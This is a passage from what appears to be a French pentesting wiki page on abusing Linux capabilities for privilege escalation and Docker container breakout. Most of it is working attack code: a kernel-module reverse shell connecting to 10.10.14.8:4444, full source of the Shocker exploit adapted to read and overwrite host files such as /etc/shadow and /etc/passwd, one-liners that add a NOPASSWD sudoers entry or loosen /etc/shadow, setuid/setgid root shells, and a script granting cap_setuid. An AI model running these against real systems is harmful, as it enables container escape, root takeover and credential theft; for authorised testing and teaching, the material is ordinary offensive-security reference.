2. Trouver un **shellcode** pour cette architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Trouver un **programme** pour **injecter** le **shellcode** dans la mémoire d’un processus ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modifier** le **shellcode** dans le programme et le **compiler** `gcc inject.c -o inject`
5. L’**injecter** et récupérer votre **shell** : `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** permet à un processus de **charger et décharger des modules du noyau (appels système `init_module(2)`, `finit_module(2)` et `delete_module(2))`**, offrant un accès direct aux opérations fondamentales du noyau. Cette capacité présente des risques critiques pour la sécurité, car le chargement d’un module peut modifier le comportement du noyau et potentiellement contourner les frontières d’isolation.<sup>[[6]](#references)[[14]](#references)</sup>
Dans un conteneur Linux rootful ordinaire, cela cible le **noyau partagé de l’hôte** et constitue donc une évasion directe. La capacité doit être effective dans l’espace de noms utilisateur initial, car le chargement de modules n’est pas isolé par des espaces de noms. Un runtime isolé par un noyau en espace utilisateur ou une VM, comme gVisor, Kata ou Hyper-V, modifie la frontière du noyau accessible. Le chargement de modules peut néanmoins être bloqué par `modules_disabled`, le verrouillage du noyau, l’application de signatures, seccomp ou un LSM.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Dans l’exemple suivant, le binaire **`python`** possède cette capacité.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Par défaut, la commande **`modprobe`** recherche les fichiers de liste des dépendances et de correspondance dans le répertoire **`/lib/modules/$(uname -r)`**.\
Pour exploiter cela, créons un faux dossier **lib/modules** :

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Puis **compilez le module du noyau que vous trouverez dans les 2 exemples ci-dessous et copiez-le** dans ce dossier :

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Enfin, exécutez le code Python nécessaire pour charger ce module du noyau :

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Exemple 2 avec un binaire**

Dans l’exemple suivant, le binaire **`kmod`** possède cette capacité.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Ce qui signifie qu'il est possible d'utiliser la commande **`insmod`** pour insérer un module du noyau. Suivez l'exemple ci-dessous pour obtenir un **reverse shell** en abusant de ce privilège.

**Exemple avec environnement (Docker breakout)**

Vous pouvez vérifier les capabilities activées dans le conteneur Docker à l'aide de :

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Dans la sortie précédente, vous pouvez voir que la capability **SYS_MODULE** est activée.<sup>[[14]](#references)</sup>

**Créez** le **kernel module** qui va exécuter un reverse shell ainsi que le **Makefile** pour le **compiler** :

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Le caractère d’espacement avant chaque commande `make` dans le Makefile **doit être une tabulation, et non des espaces** !

Exécutez `make` pour le compiler.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Enfin, démarrez `nc` dans un shell et **chargez le module** depuis un autre, et vous capturerez le shell dans le processus `nc` :

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Le code de cette technique a été copié du laboratoire « Abusing SYS_MODULE Capability » de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Un autre exemple de cette technique est disponible à l’adresse [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet à un processus de **contourner les permissions de lecture des fichiers et les permissions de lecture et d’exécution des répertoires**. Elle autorise également `open_by_handle_at(2)`, qui interprète un handle de fichier valide par rapport à un descripteur de fichier de montage pour le même système de fichiers monté. Elle n’expose pas automatiquement tous les fichiers situés en dehors de l’espace de noms de montage du processus. Pour sortir de cet espace au moyen d’un handle de fichier, il faut aussi disposer d’une référence à un système de fichiers pertinent sur l’hôte, de handles valides ou pouvant être découverts, d’un système de fichiers et d’une disposition du stockage compatibles, et qu’aucun blocage du runtime ou du LSM ne s’applique. La technique historique « Shocker » de Docker a démontré une telle combinaison dans certaines configurations vulnérables, comme l’explique [cette analyse](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Cela signifie que vous pouvez contourner les vérifications des permissions de lecture des fichiers et de lecture/d’exécution des répertoires**.<sup>[[14]](#references)</sup>

Pour un **exécutable personnalisé** doté de cette capability, examinez les données qu’il lit et renvoie à son appelant. Un outil d’analyse de fichiers qui accepte un chemin protégé choisi par l’appelant et une longueur de préfixe choisie par celui-ci, puis révèle le hash complet de ce préfixe, peut servir d’oracle de lecture de fichiers : après avoir retrouvé les `n-1` premiers octets, comparez les hashes candidats pour chaque prochain octet possible avec le hash renvoyé par l’outil pour une longueur de `n`. Cela ne dépend pas de la découverte d’une collision cryptographique ni spécifiquement de MD5 ; cela repose sur des requêtes répétées avec une longueur choisie et sur des hashes visibles et déterministes. Un hash du fichier entier sans contrôle du préfixe ne permet pas d’obtenir le même résultat. Vérifiez que l’appelant peut exécuter l’outil, que la capability du fichier devient effective, que le chemin choisi est accessible dans son espace de noms de montage et que le comportement d’entrée/sortie existe réellement. N’exécutez pas un outil privilégié inconnu uniquement pour le tester pendant une énumération passive.

**Exemple avec un binaire**

Le binaire peut lire les fichiers accessibles dans ses espaces de noms. Ainsi, si un fichier comme `tar` dispose de cette capability, il peut lire le fichier shadow :

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Exemple avec binary2**

Dans ce cas, supposons que le binaire **`python`** dispose de cette capacité. Pour lister les fichiers de root, vous pouvez faire :

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

Et pour lire un fichier, vous pourriez faire :

```python
print(open("/etc/shadow", "r").read())
```

**Exemple dans l’environnement (Docker breakout)**

Vous pouvez vérifier les capabilities activées dans le conteneur Docker à l’aide de `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Dans la sortie précédente, vous pouvez voir que la capability **DAC_READ_SEARCH** est activée. Elle contourne les vérifications DAC de lecture et de recherche et autorise `open_by_handle_at(2)` ; elle ne permet pas à elle seule de déboguer des processus.<sup>[[14]](#references)</sup>

Vous pouvez découvrir le fonctionnement de l’exploit suivant dans [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), mais en bref, **CAP_DAC_READ_SEARCH** permet de parcourir le système de fichiers sans vérification des permissions et autorise `open_by_handle_at(2)` ; cela peut exposer des fichiers ouverts par d’autres processus lorsque les espaces de noms et les points de montage concernés sont accessibles.<sup>[[13]](#references)[[14]](#references)</sup>

L’exploit original qui abuse de ces permissions pour lire des fichiers de l’hôte se trouve ici : [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c) ; voici une **version modifiée qui permet de passer le fichier à lire en premier argument et d’en enregistrer le contenu dans un fichier**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> L’exploit doit trouver un pointeur vers quelque chose de monté sur l’hôte. L’exploit d’origine utilisait le fichier /.dockerinit et cette version modifiée utilise /etc/hostname. Si l’exploit ne fonctionne pas, vous devrez peut-être définir un autre fichier. Pour trouver un fichier monté sur l’hôte, exécutez simplement la commande mount :

![CAP SYS MODULE - CAP DAC READ SEARCH : L’exploit doit trouver un pointeur vers quelque chose de monté sur l’hôte. L’exploit d’origine utilisait le fichier /.dockerinit et cette version modifiée utilise...](<../../images/image (407) (1).png>)

**Le code de cette technique a été copié du laboratoire « Abusing DAC_READ_SEARCH Capability » de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Cette capability contourne les vérifications des permissions de lecture et d’écriture des fichiers, ainsi que la plupart des vérifications d’exécution** ; l’exécution d’un fichier ordinaire nécessite toujours qu’au moins un bit d’exécution soit défini. Elle ne contourne pas un montage en lecture seule, un état immuable ni un refus d’un LSM.<sup>[[14]](#references)</sup>

Recherchez les fichiers qui deviennent lisibles ou modifiables grâce à l’appartenance à un groupe privilégié ; les cibles utiles dépendent du propriétaire et des bits de mode de la cible.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Dans cet exemple, vim possède cette capability ; vous pouvez donc modifier n’importe quel fichier comme _passwd_, _sudoers_ ou _shadow_ :

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Exemple avec le binaire 2**

Dans cet exemple, le binaire **`python`** disposera de cette capability. Vous pourrez utiliser Python pour écraser n’importe quel fichier :

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Exemple avec environnement + CAP_DAC_READ_SEARCH (Docker breakout)**

`CAP_DAC_READ_SEARCH` autorise `open_by_handle_at(2)`, mais ne contourne **pas** les vérifications des permissions d’écriture. L’écriture via un handle résolu nécessite également que l’UID/GID effectif du système de fichiers du processus ou une ACL autorise l’accès en écriture, ou que le processus dispose de `CAP_DAC_OVERRIDE`. La référence au système de fichiers pertinente sur l’hôte, les handles de fichiers pris en charge, un point de montage accessible en écriture ainsi que les politiques du runtime/LSM doivent également permettre l’opération. Vérifiez les capabilities effectives et l’identité ; aucune de ces capabilities, à elle seule, ne garantit que la cible sur l’hôte est accessible en écriture. Voir [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) et [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>

Tout d’abord, lisez la section précédente qui [**abuse de la capability DAC_READ_SEARCH pour lire des fichiers arbitraires**](linux-capabilities.md#cap_dac_read_search) de l’hôte et **compilez** l’exploit.\
L’exemple historique suivant tente d’ouvrir un fichier résolu avec `O_RDWR` ; il ne réussit que si les conditions précédentes relatives au système de fichiers et aux permissions d’écriture sont réunies :

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Afin de s’échapper du conteneur Docker, vous pouvez **télécharger** les fichiers `/etc/shadow` et `/etc/passwd` de l’hôte, y **ajouter** un **nouvel utilisateur**, puis utiliser **`shocker_write`** pour les écraser. Ensuite, **accédez-y** via **ssh**.

**Le code de cette technique a été copié du laboratoire « Abusing DAC_OVERRIDE Capability » de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Cette capability permet à un processus de modifier le propriétaire des fichiers**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Supposons que le binaire **`python`** possède cette capability ; vous pouvez modifier le propriétaire d’un fichier tel que **`shadow`**, puis utiliser l’accès ainsi obtenu pour le modifier si les autres permissions le permettent :

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Ou avec le binaire **`ruby`** doté de cette capacité :

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Cette capacité contourne les vérifications de propriété pour de nombreuses opérations sur les fichiers, notamment la modification des permissions**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si Python dispose de cette capacité, vous pouvez modifier les permissions du fichier shadow, **changer le mot de passe root** et élever vos privilèges :

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**Cette capacité permet à un processus de modifier son ID utilisateur effectif, sous réserve des règles relatives aux identifiants et aux capacités appliquées par le noyau**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si python possède cette **capacité**, vous pouvez très facilement en abuser pour élever vos privilèges à root :

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Une autre méthode :**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

Pour un exécutable **personnalisé** doté de `CAP_SETUID` effectif, examinez le chemin de code atteignable au lieu de supposer que cette capability suffit à obtenir un shell. Du texte contrôlé par l’appelant et transmis comme *chaîne de format* à [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) peut exposer ou altérer la mémoire du processus ; une transition de privilèges utile dépend toutefois d’un appel vulnérable, d’une entrée contrôlable et d’une action ultérieure à `setuid(0)`. Si cette action lance un helper externe par son nom, vérifiez l’identité effective au lancement, le `PATH` réel et si un répertoire recherché plus tôt est accessible en écriture et traversable par l’appelant. Une file capability sans effet, `no_new_privs`, un chemin fixe et fiable vers le helper ou une branche inaccessible modifie le résultat. Examinez le binaire ou les sources disponibles hors ligne ; lors d’une énumération de routine, n’exécutez pas de helper privilégié suspect.

## CAP_SETGID

**Cette capability permet à un processus de modifier son identifiant de groupe effectif, sous réserve des règles d’identifiants et de capabilities appliquées par le kernel**.<sup>[[14]](#references)</sup>

Il existe de nombreux fichiers que vous pouvez **écraser pour escalader vos privilèges** ; [**vous trouverez des idées ici**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemple avec un binaire**

Dans ce cas, recherchez les fichiers intéressants lisibles par un groupe, car vous pouvez usurper l’identité de n’importe quel groupe :

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Une fois que vous avez trouvé un fichier que vous pouvez exploiter (en lecture ou en écriture) pour élever vos privilèges, vous pouvez **obtenir un shell en vous faisant passer pour le groupe intéressant** avec :

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

Dans ce cas, le groupe shadow a été usurpé, ce qui permet de lire le fichier `/etc/shadow` :

```bash
cat /etc/shadow
```

### Chaîne combinée : CAP_SETGID + CAP_CHOWN

Lorsque les deux capacités sont disponibles dans le même helper, une chaîne pratique consiste à :

1. Passer l’EGID à `shadow` (ou à un autre groupe privilégié).
2. Utiliser `chown` sur `/etc/shadow` pour définir votre UID tout en conservant le groupe `shadow`.
3. Lire un hash cible et le crack/pivoter.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Cela évite d’avoir besoin directement des privilèges root complets et suffit souvent pour pivoter grâce à la réutilisation d’identifiants.

Si **docker** est installé, vous pouvez **usurper** le **groupe docker** et en abuser pour communiquer avec le [**socket docker** et élever vos privilèges](#writable-docker-socket).

## CAP_SETFCAP

**Cette capability permet à un processus de définir des capacités de fichier**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si python possède cette **capability**, vous pouvez très facilement en abuser pour élever vos privilèges au niveau root :

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Un nouvel ensemble de capacités attribué à un fichier remplace l’ensemble précédent ; si le helper est ensuite exécuté avec uniquement les nouvelles capacités, il risque de ne plus conserver `CAP_SETFCAP` pour modifier un autre fichier.<sup>[[14]](#references)[[25]](#references)</sup>

Une fois que vous disposez de la [capacité SETUID](linux-capabilities.md#cap_setuid), vous pouvez consulter sa section pour savoir comment élever vos privilèges.

**Exemple avec un environnement (Docker breakout)**

L’ensemble de capacités par défaut documenté par Docker inclut **CAP_SETFCAP**, mais l’ensemble réel dépend de la configuration du runtime.<sup>[[19]](#references)</sup>
Vous pouvez inspecter les capacités du processus avec :

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Cette capacité permet d’écrire des capacités de fichier, mais n’accorde pas à elle seule ces capacités au processus actuel et ne contourne pas les règles relatives au fichier, au bounding set et aux espaces de noms appliquées lors de l’exécution du fichier.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Les capabilities autorisées du fichier sont limitées par l’ensemble de capabilities de limitation du processus, et le bit effectif du fichier détermine si l’ensemble autorisé du fichier est ajouté à l’ensemble effectif du processus. C’est pourquoi l’ajout de capabilities à un fichier ne rend pas automatiquement chaque capability demandée utilisable au moment de l’exécution.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet plusieurs opérations sensibles, notamment l’accès à `/dev/mem`, `/dev/kmem` ou `/proc/kcore`, la modification de `mmap_min_addr`, l’accès aux appels système `ioperm(2)` et `iopl(2)`, ainsi que diverses commandes de disque. Le `FIBMAP ioctl(2)` est également activé par cette capability, ce qui a causé des problèmes [par le passé](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Selon la page de manuel, elle permet aussi à son détenteur d’effectuer diverses opérations propres à certains périphériques.<sup>[[14]](#references)</sup>

Cela peut être utile pour l’**élévation de privilèges** et le **Docker breakout**.<sup>[[14]](#references)</sup>

À elle seule, cette capability n’expose aucune interface utile. Un container breakout nécessite également un périphérique ou une ressource de l’hôte accessible, des permissions sur le device-cgroup et le système de fichiers, ainsi qu’une technique propre au matériel et au kernel. Des restrictions strictes sur `/dev/mem`, le kernel lockdown, la virtualisation, seccomp et les règles LSM suppriment souvent les voies génériques. Vérifiez d’abord la capability et les ressources exposées :

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

Si `/dev/mem` est l’interface approuvée, un lab jetable peut démontrer la divulgation de mémoire du nœud au-delà des frontières en lisant et en hachant une plage sélectionnée à partir de la carte matérielle de ce lab :

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
